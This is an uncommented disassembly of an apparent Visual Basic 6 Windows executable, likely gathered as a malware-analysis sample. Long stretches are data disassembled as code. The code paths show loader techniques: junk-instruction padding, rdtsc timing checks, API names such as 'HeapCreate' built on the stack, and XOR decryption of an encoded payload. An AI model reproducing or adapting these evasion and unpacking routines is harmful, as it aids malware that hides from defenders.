_start
push r-xdata
call Ordinal_MSVBVM60_100
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x1d79b730 ] dl
mov ecx 0xd1ac4ee2
or [ esi - 0x6f973b79 ] ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
pop ds
add eax 0x47
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
outsb
popad
jb r-xdata
imul esi [ ebx + 0x68 ] 0x6c776f62
add [ eax ] al
inc esi
or al [ eax ]
add [ eax ] al
or [ eax ] eax
inc esi
add [ esi + 0xa ] al
add [ eax ] al
add [ ecx ] cl
add [ esi + 0x69 ] al
jae r-xdata
arpl [ eax ] ax
or [ ecx ] al
or eax 0x70000701
push 0x696c6c69
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add [ eax ] al
add [ edx - 0x38 ] al
hlt
jae r-xdata
bound ebp [ edi + 0x77 ]
insb
sbb [ ecx ] eax
add [ edx ] al
and al [ eax ]
and edi esi
or [ eax ] eax
add [ esp + esi * 2 ] ch
add dh dh
or [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ edx ] al
add [ eax ] dl
adc [ eax ] al
add [ ecx ] al
add [ eax ] cl
add [ eax + 0x5 ] ch
add [ eax ] al
add [ es : eax ] al
add [ eax ] dl
adc [ eax ] al
add [ ecx ] al
add [ eax ] ah
add [ eax + 0x4 ] ch
add [ eax ] al
mov es [ 0x280000 ]
add [ eax ] al
adc [ eax ] al
add [ eax ] al
and [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_402187
inc [ eax ]
add [ eax ] al
add [ edi + ebp - 0x4f97ffc0 ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c ] cl
nop
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and [ eax ] eax
add [ eax ] eax
add [ eax ] al
insb
xor al 0x40
add [ eax ] al
add [ eax ] al
add ah ch
and [ eax ] eax
add [ eax ] eax
add [ eax ] al
hlt
sub_406f61
cmp eax [ eax + 0x48 ]
fbld [ esi * 2 + 0x311bf745 ]
inc ebp
bound edi [ edx + 0x68b65843 ]
and ebx [ ecx + 0x27 ]
jle r-xdata
inc edx
xchg esp eax
sbb [ ebx + 0x43 ] bh
jne r-xdata
sbb bh [ ebx - 0x37a7ea1 ]
push 0xffffffbb
das
or ch al
cwde
inc ebx
add [ ebx - 0xc ] dl
sub eax 0x263acf1c
push ds
or al [ eax ]
add [ eax ] al
add [ eax ] al
add [ ebx ] dl
or eax 0x4340dc85
mov dl 0xf7
jns r-xdata
mov dl 0x32
loope r-xdata
adc [ ecx + 0x65b0b045 ] esi
das
fnsave [ eax - 0x67c3e01 ]
sbb [ eax - 0x1d ] 0x6cc40a0c
jmp r-xdata
in al 0x43
xchg esi eax
jae r-xdata
0xb95e2518 0xbc4
iretd
adc bl dh
jecxz r-xdata
mov al 0xb0
das
cmp dl [ eax ]
loop r-xdata
jo r-xdata
fild [ eax - 0x2911e999 ]
adc [ ecx + ebp ] edi
out dx al
movsb [ edi ] [ esi ]
and edi [ eax + 0x71687905 ]
out 0x71 eax
jge r-xdata
cli
jb r-xdata
or esi [ ecx + 0x2e7d68a4 ]
mov [ edi ] cl
mov edx 0x57c23f4f
test [ eax ] ebx
adc [ edi + ecx + 0x200a6af2 ] bl
pop edi
dec esi
pop eax
jno r-xdata
in al 0xa6
stc
pop ds
or al bl
jae r-xdata
insd
sub [ 0x424a9ec2 ] 0x46
enter 0xc991 0x75
sar cl 0x4f
mov ah 0x5
into
insb
jecxz r-xdata
0xf3a9
or [ ebx ] cl
cmp [ ebx + 0x6f ] bl
test [ esi - 0x22 ] ebx
xor edi ebp
mov [ eax - 0x11c2ebeb ] gs
sbb ecx [ ebp + 0x5d ]
divps xmm6 [ ecx - 0x7a ]
sub dh [ edi + 0x7933ab48 ]
jne r-xdata
in al 0xd
xchg edi eax
mov bh 0xe0
scasb [ edi ]
sbb al 0x8b
stosd [ edi ]
push edi
inc ebx
sti
cmp [ ebx ] ebx
sbb ecx [ gs : eax ]
or edi [ eax ]
pop ebx
outsd
jecxz r-xdata
scasb [ edi ]
mov bh 0x7f
leave
adc [ eax + 0x7d ] ch
jl 0x73f6acb4
sub ebx [ edx - 0x722ed3a4 ]
push esp
push es
push 0xefdabd3d
iretd
push es
or [ edi - 0x7ec87941 ] ah
push ebx
xchg esi eax
adc [ edi - 0x15 ] cl
dec ebx
sbb [ eax - 0x42 ] esi
dec esp
mov al 0x4
mov [ edx + 0xf ] edi
or eax 0xc18bceb4
inc esp
jle r-xdata
pop ds
add [ ecx - 0x5d ] edi
mov ch 0x3a
xor eax 0x34a299ce
sub ecx ecx
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
scasb [ edi ]
mov cl 0x76
add ch 0x1f
scasb [ edi ]
imul edi ebp 0x79def00b
mov cl 0x16
pop edi
sub_45253d
push si
pop si
mov ecx 0x77
push 0x0
loop r-xdata
push 0x24bfb30d
push 0x0
push 0x1e8
mov [ ebp + 0x52 ] esp
add esp 0x1e8
jmp r-xdata
call sub_45257d
push ebx
dec eax
inc ebp
dec esp
dec esp
xor esi [ edx ]
inc esp
dec esp
dec esp
and [ eax ] al
pop eax
push [ ebp + 0x52 ]
push 0x2
call eax
mov ecx 0xaa0000
rdtsc
loop r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push di
pop di
push 0x0
push di
pop di
push 0x0
jmp r-xdata
mov [ esp + 0x7 ] 0x32
mov [ esp ] 0x4b
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov [ esp + 0x1 ] 0x65
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x6 ] 0x33
push di
pop di
mov [ esp + 0x3 ] 0x6e
push di
pop di
mov [ ebp + 0x10 ] cl
mov [ esp + 0x5 ] 0x6c
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
push si
pop si
mov [ esp + 0x2 ] 0x72
push di
pop di
mov [ esp + 0x4 ] 0x65
mov eax ecx
mov ecx esp
add ecx eax
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push di
pop di
push 0x0
push di
pop di
push 0x0
jmp r-xdata
inc ebx
dec esp
xor [ esp ] 0x48
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov dl 0x65
or [ esp + 0x1 ] dl
jmp r-xdata
inc ebx
dec esp
mov [ esp + 0x2 ] 0x61
jmp r-xdata
mov [ esp + 0x3 ] 0x70
jmp r-xdata
mov [ esp + 0x4 ] 0x43
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x5 ] 0x72
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov [ esp + 0x6 ] 0x65
push di
pop di
mov [ esp + 0x7 ] 0x61
push si
pop si
mov [ esp + 0x8 ] 0x74
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
mov [ esp + 0x9 ] 0x65
mov edx esp
jmp r-xdata
inc ebx
dec esp
call sub_4525f6
mov [ ebp + 0x10 ] cl
push 0x0
mov [ ebp + 0x10 ] cl
push 0x0
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
add [ esp ] 0x40000
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
call eax
push si
pop si
mov [ ebp + 0x8 ] eax
pop eax
pop eax
pop eax
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov ecx esp
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push 0x0
push 0x0
xor [ esp ] 0x48
mov [ ebp + 0x10 ] cl
xor [ esp + 0x1 ] 0x64
jmp r-xdata
inc [ esp + 0x1 ]
push di
pop di
mov [ esp + 0x2 ] 0x61
jmp r-xdata
mov [ esp + 0x3 ] 0x70
push si
pop si
mov [ esp + 0x4 ] 0x41
push di
pop di
mov [ esp + 0x5 ] 0x6c
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x6 ] 0x6c
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x7 ] 0x6f
push si
pop si
mov [ esp + 0x8 ] 0x63
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov edx esp
call sub_4525f6
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
mov [ ebp + 0x10 ] cl
add [ esp ] 0x2f84
jmp r-xdata
push 0x8
push di
pop di
push [ ebp + 0x8 ]
jmp r-xdata
call eax
push si
pop si
jmp r-xdata
call sub_452903
in al dx
mov esp 0x2d183f9a
jg r-xdata
mov dl 0x29
and edi [ edi + 0x5b ]
mov ecx 0x396b3fbe
dec ebp
jge r-xdata
bswap ebx
sub [ ecx ] ecx
andps xmm7 [ 0xffffffffb95b7c23 ]
lea edi [ esi + 0x5b ]
mov ecx 0x30f97035
in eax 0xbe
mov bl 0xae
mov dh 0x9f
mov dh 0xb1
dec esi
pop eax
mov ecx 0xddcbef35
xchg esp eax
dec edi
pop ebx
mov ecx 0x33cbef35
jne r-xdata
loop r-xdata
cmp al 0xcb
jge r-xdata
pop edx
cmp cl ch
jle r-xdata
mov esi 0x9fb6aeb3

pop ebx
out dx al
0x4f2e
pop ss
pop ebx
test eax 0xb1317f35
or [ ebx + 0x4d54dce9 ] 0xb9
xor eax 0x238ab226
jg r-xdata
mov ebp ecx
fcom [ ebp + ecx * 2 - 0x47 ]
mov ecx 0xb94c51dc
xor eax 0x31f4d226
xchg esi eax
mov eax [ ss : 0x51017f35 ]
mov dh 0x6f
pop ebx
mov ecx 0xb9cffabc
xor eax 0x2329b27f
jg r-xdata
fadd [ ecx + 0x35 ]
jo r-xdata
jecxz r-xdata
or bl dl
xor eax 0xcaee5b15
dec edi
cmp [ esi ] cl
sub eax 0xa71e91f
push edx
cmp [ esi + 0x7b ] cl
pop ds
xchg edi eax
push ecx
adc ebp [ edi ]
loop r-xdata
loopne r-xdata
sti
mov edi 0xd27f35b8
inc ecx
outsd
jpe r-xdata
pop ebx
fnstsw [ esi + 0x35b96b62 ]
jg r-xdata
push ebp
dec ebx
mov ecx 0xd39df635
adc eax 0xbce28b80
mov eax [ 0x77be7ed2 ]
imul edi [ ecx - 0x1d2f80cb ] 0x2d
inc esp
pop ebx
mov dh 0xb1
mov ds [ edx - 0x47 ]
xor eax 0x37b9e0ff
jg r-xdata
adc eax 0x1be5465e
jg r-xdata
cli
lea esi [ 0xffffffffcd3a5b7f ]
pop esi
inc esi
in eax 0x1b
hlt
mov ecx 0xb8bffb3a
xor eax 0x6f41d27f
sub eax 0xe15b7f35
or [ gs : ebx + 0x5b7f1184 ] 0xf9
cmp al 0xdb
jle r-xdata
pop edi
mov ecx 0x19ce8035
xor eax 0x35d35b7f
or dh 0x19
xor eax 0x35845b7f
jpo r-xdata
xor cl [ esi ]
hlt
scasb [ edi ]
loope r-xdata
inc ecx
jle r-xdata
pop ebx
stc
mov ecx 0x505f32be
push cs
imul ebx [ ebx - 0x47 ] 0xb622976f
xor eax 0x953cd27f
jg r-xdata
pop ebx
shl [ 0x35d35b15 ] cl
mov ecx 0xb8e7fd3a
add [ ecx - 0x6a ] edx
jno r-xdata
xchg edi eax
mov ah 0xa8
xor eax 0x31f4d07f
xchg esi eax
mov esi 0x17f35ac
push ecx
shl [ ecx + 0x5b ] cl
mov ecx 0xd35b1565
xor eax 0x35d35b15
jo r-xdata
cld
movsd [ edi ] [ esi ]
xor eax 0x3651017f
jo r-xdata
pop ebx
mov ecx 0xb9cfeaca
xor eax 0x45f4d07f
xchg esi eax
mov ecx 0xb95f7f5d
xor eax 0x3519ce80
jg r-xdata
jg r-xdata
mov dl 0x5c
and [ edi + 0x5b ] bh
jecxz r-xdata
shl ah 0x1
xor [ esi + 0x7f35acbe ] edx
add [ ecx - 0x2e ] edx
jno r-xdata
loopne r-xdata
shl ah 0x1
mov ecx 0x326b3abc
js r-xdata
cmp ah [ ebx ]
push eax
shl ah 0x1
xor [ esi + 0x7f35ac94 ] edx
mov bl 0xd
cmp edi [ edi + 0x5b ]
xor [ eax + 0x53 ] dh
scasb [ edi ]
shl [ 0x3519ce80 ] cl
jg r-xdata
in eax 0x6b
pop ebx
mov ecx 0xad83966c
xor eax 0x7e51017f
jno r-xdata
push 0x71
pop ebx
push ecx
pop ebx
shl [ 0x35a8b497 ] cl
jg r-xdata
test eax 0xf635b955
push ds
popfd
mov esi 0x37505f32
imul ebx [ ebx - 0x47 ] 0xb79e976f
pop edi
push eax
pop esp
mov ecx 0x327b3abc
js r-xdata
jg r-xdata
xor ch [ ebx ]
push eax
push esp
push 0x976fb95b
sbb dh [ esi + 0x4f6a7f35 ]
add al 0x80
or edx ebx
cmp al [ eax + 0x7f352dce ]
mov ecx 0xd3533abc
xor [ edi ] edx
pop ebx
test eax 0xb9337f35
mov ch 0x7f
pop ebx
shl [ 0x6046a415 ] cl
jg r-xdata
mov dl 0x45
and [ edi + 0x5b ] edi
jecxz r-xdata
pop ebx
xor [ esi + 0x7f35ac54 ] edx
add [ ecx + 0xe ] edx
mov ecx 0xf4d0b8bc
pop ebx
xor eax 0x22e6b27f
jg r-xdata
test [ 0x3ab95b7b ] dh
std
out 0xb8 eax
cdq
inc eax
fwait
fadd [ esi + 0x31 ]
add [ eax - 0x2f ] edx
jne r-xdata
hlt
pop ebx
loope r-xdata
jpe r-xdata
cmp cl ch
xor eax 0x1dfcd27f
hlt
pop ebx
mov ecx 0xb79e976f
or [ ebx + 0x5b7f1184 ] 0xf9
jg r-xdata
jg r-xdata
jno r-xdata
push esp
lodsb [ esi ]
xor eax 0xe51017f
mov ecx 0x460b2b35
loop r-xdata
push 0x5b
mov ecx 0xb7da976f
xor eax 0x55fcd27f
hlt
in eax dx
push ebp
mov ecx 0x8d1ef635
mov esi 0x5c505f32
js r-xdata
fwait
dec ebp
mov ecx 0x5db32535
cmp [ edi + 0x5b ] bh
mov dh ch
test dh 0x25
xor eax 0x1e525b7f
jle r-xdata
push ecx
push ecx
les ebx [ edi + edx ]
jmp ebp
in eax 0xb5
xor al 0x7f
pop ebx
leave
cmp edi [ edi + 0x5b ]
xor [ eax + 0x33 ] dh
shl ah 0x1
xor [ esi + 0x7f35af5f ] edx
add [ ecx + 0x6a ] edx
jno r-xdata
cmp eax 0x35be5b7f
daa
mov dl 0x4a
and [ edi + 0x5b ] bh
cld
and al 0xd2
push eax
mov ah 0xbe
push edx
push ds
pop ebx
mov ch 0x34
jg r-xdata
sub al 0xa1
jg r-xdata
ja r-xdata
test [ esi - 0x47 ] ecx
xor eax 0x3841b325
jg r-xdata
loopne r-xdata
pop ebx
mov ecx 0x50233abc
pop ebx
mov ecx 0xfc9c7840
aam 0xfc
jno r-xdata
mov ecx 0x2ca47cf8
test eax 0xddb95b7f
scasd [ edi ]
movsb [ edi ] [ esi ]
pop ebx
jpo r-xdata
loopne r-xdata
xor [ eax + 0x2f ] dh
mov dl 0x67
and edi [ edi + 0x5b ]
or edi [ edx + 0x35 ]
jg r-xdata
sbb al 0x17
shr [ edi + 0x30037f35 ] 0x1
jg r-xdata
daa
mov dl 0xb1
and edi [ edi + 0x5b ]
mov dl 0x15
and bh [ edi + 0x5b ]
loope r-xdata
sub al 0xa9
jg r-xdata
mov ecx 0xd3537f35
jne r-xdata
jg r-xdata
int1
dec esp
mov ecx 0xcca42635
or eax 0x6466b80
sar ah 0x1
cmp [ edx - 0x67 ] edi
jg r-xdata
cmp al [ edi + 0x39 ]
or eax 0x6d3d547e
jne r-xdata
jo r-xdata
add esi [ eax ]
0x17f4
mov ecx 0x46a4afdd
xchg esi eax
pushfd
scasd [ edi ]
xor eax 0xdfcd47f
xchg esi eax
shr [ edi - 0x32b80cb ] 0x9
xchg esi eax
scasb [ edi ]
stosd [ edi ]
xor eax 0x75fcd47f
xchg esi eax
pop ebx
mov [ 0x35d30c7f ] esi
adc eax 0x776046a4
fcom [ esi + 0x31 ]
cld
mov ecx 0xf4d02435
cld
sub esp edi
arpl [ eax - 0x154c8ec0 ] di
and al 0x7f
pop ebx
cmp cl ch
jle r-xdata
shl al 0x1
adc [ esi ] ebp
mov ecx 0xbc573abe
idiv [ esi ]
pop ebx
mov ecx 0x7f167ff3
jne r-xdata
cmp [ esi + 0x7f35af9c ] edx
aam 0xfc
or eax 0x35afc196
jg r-xdata
mov ecx 0xfcd29641
shl [ 0x6046a415 ] cl
ja r-xdata
loop r-xdata
pop ebx
cmp esp esi
dec ebx
xor [ ebx + edi * 2 - 0x69ca46b9 ] ah
out 0x9e eax
xor eax 0x4046027f
inc edi
movsb [ edi ] [ esi ]
mov cl dl
dec edi
or dh [ edx ]
jo r-xdata
mov ecx 0x3a433abe
or eax 0xdcf12f7f
add eax 0x2435b94d
cld
or [ esi + 0x7f35abae ] edx
aam 0xfc
jne r-xdata
xor eax 0x1f35b958
pop esi
jpo r-xdata
jg r-xdata
mov ecx 0x34d01f35
xchg ecx eax
cmp al 0x4b
ja r-xdata
shl [ esi ] 0x1
int1
fdivr [ esi - 0x34cfa8fe ]
div [ ebx + 0x5f ]
add [ eax + 0x3 ] edx
push 0xf46db95b
inc esi
mov [ 0xffffffffd29641b9 ] eax
cld
push esi
xor esp edi
test eax 0xb6b95b7f
xchg [ ecx - 0x3c ] edx
pop edi
stosb [ edi ]
xor eax 0x71fcd47f
xchg esi eax
mov ecx 0xd358f635
jne r-xdata
mov al [ 0x5f73f638 ]
mov ecx 0xb949b2dc
xor eax 0x3935b325
jg r-xdata
shl [ ecx + edx * 4 ] 0x1
pop ds
jg r-xdata
dec ecx
mov ecx 0x35b32535
cmp [ edi + 0x5b ] edi
mov ecx 0xb94d7bdc
xor eax 0x23b1b227
jg r-xdata
pop ebx
mov ecx 0xbe9fe0bc
xor eax 0x65e6d07f
test ah 0x71
xor bh [ edi + 0x5b ]
xor ch [ edx + 0x2b ]
shl [ esi ] cl
stc
js r-xdata
pop ebx
xor [ eax + 0x27 ] dh
mov ch 0x62
xchg edi eax
push eax
mov ch 0x35
jg r-xdata
inc edi
pop edx
mov dh 0xb1
jmp 0xffffffffba452120
pop ebx
mov ecx 0x305bf46d
jo r-xdata
jmp 0xffffffffb998fcbb
pop ebx
mov ecx 0xb14fc0b6
xor eax 0xb1b65b7f
ror edx cl
int 0x7f
das
dec ebx
pop edi
aas
xor edi [ ecx + 0x465b7f05 ]
xor [ edi + 0x53 ] 0xb9
xor eax 0x3db9ec80
jg r-xdata
pop ebx
mov ecx 0x3a6f2aca
mov ecx 0x321b90b6
mov dl 0xbf
pop ebx
mov ecx 0xaddcf635
cmp eax 0xb2325b7f
jg r-xdata
add [ 0xfffffffff7b95b7f ] esi
ja r-xdata
dec [ ecx ]
hlt
jg r-xdata
mov dl 0x46
and edi [ edi + 0x5b ]
loope r-xdata
dec edi
push ecx
xor dh [ edx + 0x35b95773 ]
cld
mov [ 0xffffffffc3fb3ab9 ] eax
mov ecx 0x3e587f35
xor eax 0xbcb95b77
cmp cl [ ebx + 0x32 ]
mov dl 0x7f
push edi
mov ecx 0xcc9bfa35
xor esi esp
ja r-xdata
mov ecx 0xa1dcf635
cmp eax 0x6a325b7f
inc ebx
fidivr [ edx - 0x33 ]
jg r-xdata
jpe r-xdata
sbb eax 0xe35b7f27
fld [ 0xffffffff9435b957 ]
dec eax
jecxz r-xdata
aas
sbb [ 0xffffffffbeb95b7f ] al
aas
push edi
xor dh [ ebp + 0x73 ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
mov ecx 0xefa87e6b
mov esp 0xf33a057c
jpo r-xdata
xor eax 0x34b95b77
test al 0xb3
xor eax 0x25fc9c7f
jg r-xdata
or [ esi ] 0xb1
mov dh 0x87
mov ecx 0xb9ec8035
cmp eax 0xcad35b7f
pop ebx
int 0xd6
mul [ ebp + 0x4b7ff338 ]
mov ecx 0xe8924e35
0x4b09
mov ecx 0x7fd8256e
sbb eax 0x779198fc
sub eax 0x77312e62
pop ebx
mov ecx 0xea4a040
xor eax 0xcab95b77
sub ch [ edi + 0x3a ]
mov ecx 0xb14be0bc
xor eax 0xb447d27f
mov ecx 0x7f35a95b
push 0x6b
sub al 0x31
xchg ecx eax
mov esi 0xedb8573a
das
or eax 0x5b744051
shl ah 0x1
fadd [ 0x2435b94d ]
clc
xor eax 0x5b510b7f
ja r-xdata
out 0x1d al
test ah 0xa9
cmp eax 0xbedf5b7f
and [ ebp - 0x21 ] bl
mov esp 0x35be9fe0
jg r-xdata
sub al 0x9
fnstsw [ esi + 0x35b94372 ]
jg r-xdata
add al [ ebx ]
mov eax 0xb207fb3a
xor eax 0x5183f7f
jg r-xdata
mov ecx 0x305b7f35
jge r-xdata
shl [ esi ] 0x1
cmp eax 0xdeb95b77
jpe r-xdata
mov ecx 0xefa87e6b
mov esp 0xbe9bb07c
ficomp [ bp + si - 0x36 ]
sbb [ ebx - 0x47 ] 0xbc
and cl [ edi + 0x51 ]
mov esi [ ebp + 0x5b ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
xlat
jne r-xdata
push edx
adc dh ah
inc ebx
mov edx 0xb9537faa
xor eax 0xbcbb98fc
and cl [ edi + 0x51 ]
sub ch [ ebx + 0x26 ]
fdivr [ eax + 0x21 ]
xchg esi eax
insb
inc esi
0xb380
fsubr [ ecx + 0x305b7f39 ]
mov dl 0x7f
push edi
mov ecx 0xefad4e35
mov esi 0x35b55bf8
mov ecx 0xad1eb835
xor eax 0xb6b95b7f
ror [ edi - 0x4f ] 0x35
jg r-xdata
mov ch 0x34
mov esp 0x17757ed8
mov [ 0x87f35b9 ] eax
out dx al
fisttp [ ebx - 0xbca46b0 ]
add al 0x8d
mov esp 0x35be9be0
jg r-xdata
js r-xdata
int1
xor al 0x91
movsb [ edi ] [ esi ]
imul ebx esi 0xca51b36a
and [ esi + eax * 2 + 0x465f5b41 ] 0x61
pop ebx
push edi
[ esi ] ebp
fdivr [ edi + 0x1d ]
mov ecx 0x32573fbe
jne r-xdata
jg r-xdata
ror [ esi ] 0x1
xor eax 0xbcb95b77
cmovae edi [ edx - 0x46acd07e ]
xor eax 0xb6a52bf6
add al [ ebx ]
mov eax 0x47d22b41
mov ah 0xb9
pop ebx
test eax 0x706a7f35
mul [ fs : ebx + 0x5b7335bc ]
mov ecx 0xb21a9765
xor eax 0x4346087f
add edi [ eax + 0x47d22b41 ]
jg r-xdata
pop ebx
mov ch 0x35
mov dh 0x5b
mov ecx 0xed02e35
and [ edi + 0x5b ] esi
mov ecx 0xb15bf8be
xor eax 0x34495a7f
mov bh 0x31
lodsd [ esi ]
mul [ gs : eax + 0x577ff638 ]
mov ecx 0xfb32c35
aas
jg r-xdata
mov dh 0xb1
ja r-xdata
ja r-xdata
inc esi
inc ebx
xor eax 0x65b95b77
adc eax 0x1f6046a4
mov ecx 0xba430fbc
sub [ edi ] 0x53
mov ecx 0xa52bf635
mov dh 0x2
pushad
xor [ ss : edi + 0x5b ] esi
mov ecx 0x41d2ad40
xor [ edi + 0x57 ] bh
mov ecx 0xbb312f35
0x57c8
xor eax 0x36b95b77
cmp [ edi - 0x17 ] edx
pop edi
and [ esp + ebp * 8 + 0x7fd82655 ] 0x1d
shl bh 0x1
add esi esi
adc al 0xbd
mov esi 0xba300b31
adc ebx [ edx - 0x47 ]
xor eax 0xbcb526f4
xchg al bl
js r-xdata
shr [ esi ] 0x1
ja r-xdata
mov ecx 0x46a41565
pushad
pop ds
pop edx
mov ecx 0xb526f435
mov esp 0x7d78d886
mov ecx 0xb15be836
xor eax 0x38323f7f
mov [ 0x16fa3ab8 ] eax
not [ esi * 4 + 0x301fbeb6 ]
jpe r-xdata
inc esi
0xd080
cli
fdivr [ eax + 0x25 ]
not [ ecx + ebp * 4 ]
pop ebx
mov ecx 0xbd1af435
mov esp 0x6530af2f
mov [ 0xffffffff94b67ad2 ] eax
xor [ si ] ch
cld
cwde
test [ esi - 0x16cfd06c ] esi
cld
cwde
mov cl 0xbc
mov [ 0xfffffffff40578d8 ] al
inc edx
mov ah bh
dec esi
lodsd [ esi ]
mov dl cl
cmp [ ecx - 0x2d8cb7ce ] 0x41
xor [ ebp - 0x9ca46e6 ] bh
push ds
in eax dx
mov esi 0x44320f32
inc ebx
pop edx
ja r-xdata
dec eax
mov ah 0xbe
mov edi [ ecx - 0x92d80cb ]
jno r-xdata
adc al 0xa9
push ss
mov ebp 0xb94b1bdc
xor eax 0x3cb9b325
jg r-xdata
push ss
inc esi
in eax 0xf6
push ds
rcr ebp 0x1
adc eax 0xf635b953
push ds
aad 0xbc
xchg [ esi + 0x45 ] ebx
cmp bh [ edi + 0x5b ]
xor bh [ eax + 0x27 ]
shl [ ecx - 0x32a4794a ] cl
cmp esi esp
push ds
in eax dx
mov esi 0xedb86727
sbb [ ecx + edi * 8 + 0x325b7f21 ] ebx
js r-xdata
enter 0xb837 0x35
jg r-xdata
mov dl 0x86
and eax 0xdde35b7f
mov ecx 0x8035b953
sub al 0xb1
0x5708
inc esi
in eax 0xfc
into
xor esp esi
adc al 0xb1
0xa44e
sub_45257d
pop ecx
jmp r-xdata
call sub_452580
inc ecx
push ebx
push 0x5f6c6c65
dec esi
outsd
je r-xdata
xor ah [ esi + 0x56 ]
jns r-xdata
jmp r-xdata
inc ebp
or al 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
arpl [ edi + 0x6e ] bp
push edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x15 ] bl
loope r-xdata
cmp edi [ ebp + 0x3c ]
jne r-xdata
pop si
push di
pop di
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
add di 0x4
jmp r-xdata
xor esi ebx
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ edx ] 0x0
mov [ ebp + 0x10 ] cl
xor [ edx ] esi
inc ebx
dec esp
push si
inc edx
call sub_4525f6
push eax
push [ ebp + 0x52 ]
push 0x0
call eax
cmp eax 0x1
je r-xdata
mov [ ebp + 0x10 ] cl
push eax
mov [ ebp + 0x10 ] cl
pop edx
push si
pop si
add edx edi
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov esi [ edx ]
mov [ ebp + 0x10 ] cl
jmp r-xdata
jmp r-xdata
pop eax
push [ ebp + 0x52 ]
push 0x2
call eax
mov ecx 0xaa0000
call sub_45257d
push ebx
dec eax
inc ebp
dec esp
dec esp
xor esi [ edx ]
inc esp
dec esp
dec esp
and [ eax ] al
add esp 0xc
add esp 0xc
push di
pop di
call eax
jmp r-xdata
rdtsc
loop r-xdata
jmp r-xdata
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push di
pop di
push 0x0
push di
pop di
push 0x0
jmp r-xdata
call sub_452903
in al dx
mov esp 0x2d183f9a
jg r-xdata
inc ebx
dec esp
mov [ esp + 0x7 ] 0x32
mov [ esp ] 0x4b
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov dl 0x29
and edi [ edi + 0x5b ]
mov ecx 0x396b3fbe
dec ebp
jge r-xdata
mov [ esp + 0x1 ] 0x65
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ esp + 0x6 ] 0x33
push di
pop di
mov [ esp + 0x3 ] 0x6e
push di
pop di
mov [ ebp + 0x10 ] cl
mov [ esp + 0x5 ] 0x6c
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
bswap ebx
sub [ ecx ] ecx
andps xmm7 [ 0xffffffffb95b7c23 ]
lea edi [ esi + 0x5b ]
mov ecx 0x30f97035
in eax 0xbe
mov bl 0xae
mov dh 0x9f
mov dh 0xb1
dec esi
pop eax
mov ecx 0xddcbef35
xchg esp eax
dec edi
pop ebx
mov ecx 0x33cbef35
jne r-xdata
push si
pop si
mov [ esp + 0x2 ] 0x72
push di
pop di
mov [ esp + 0x4 ] 0x65
mov eax ecx
mov ecx esp
add ecx eax
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push 0x0
push di
pop di
push 0x0
push di
pop di
push 0x0
jmp r-xdata
inc ebx
dec esp
loop r-xdata
cmp al 0xcb
jge r-xdata
pop edx
cmp cl ch
jle r-xdata
mov esi 0x9fb6aeb3

xor [ esp ] 0x48
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
pop ebx
out dx al
0x4f2e
pop ss
pop ebx
test eax 0xb1317f35
or [ ebx + 0x4d54dce9 ] 0xb9
xor eax 0x238ab226
jg r-xdata
mov ebp ecx
fcom [ ebp + ecx * 2 - 0x47 ]
mov ecx 0xb94c51dc
xor eax 0x31f4d226
xchg esi eax
mov eax [ ss : 0x51017f35 ]
mov dh 0x6f
pop ebx
mov ecx 0xb9cffabc
xor eax 0x2329b27f
jg r-xdata
mov dl 0x65
or [ esp + 0x1 ] dl
jmp r-xdata
inc ebx
dec esp
